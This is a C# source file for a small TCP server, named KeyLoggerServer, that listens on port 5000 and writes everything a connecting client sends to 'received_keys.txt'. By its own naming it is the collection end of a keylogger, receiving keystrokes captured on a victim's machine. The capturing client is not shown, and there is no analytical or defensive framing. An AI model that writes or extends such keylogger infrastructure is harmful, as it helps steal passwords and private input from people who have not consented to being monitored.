using System;
using System.IO;
using System.Net;
using System.Net.Sockets;

namespace KeyLoggerServer
{
    class Program
    {
        static void Main(string[] args)
        {
            int port = 5000; // Listening port
            string logFilePath = "received_keys.txt";

            Console.WriteLine($"Starting TCP server on port {port}...");
            TcpListener listener = new TcpListener(IPAddress.Any, port);

            listener.Start();
            Console.WriteLine("Server is running. Waiting for connections...");

            using (TcpClient client = listener.AcceptTcpClient())
            {
                Console.WriteLine("Client connected.");
                using NetworkStream stream = client.GetStream();
                using StreamWriter writer = new StreamWriter(logFilePath, true) { AutoFlush = true };

                byte[] buffer = new byte[1024];
                int bytesRead;

                while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    string data = System.Text.Encoding.ASCII.GetString(buffer, 0, bytesRead);
                    Console.Write(data);
                    writer.Write(data);
                }
            }

            Console.WriteLine("Client disconnected. Server shutting down.");
            listener.Stop();
        }
    }
}

